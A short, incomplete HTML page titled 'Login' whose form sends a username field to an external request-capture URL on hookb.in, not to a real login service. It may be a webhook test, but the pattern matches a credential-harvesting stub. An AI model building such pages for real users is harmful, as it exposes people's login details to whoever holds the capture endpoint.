<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
</head>
<body>
<form method="POST" action="https://hookb.in/3OQNmZgMzEFL6JexamD0">
    <label for="username">Username</label>
    <input type="text" id="username" name="username" required autofocus>

</form>

</body>
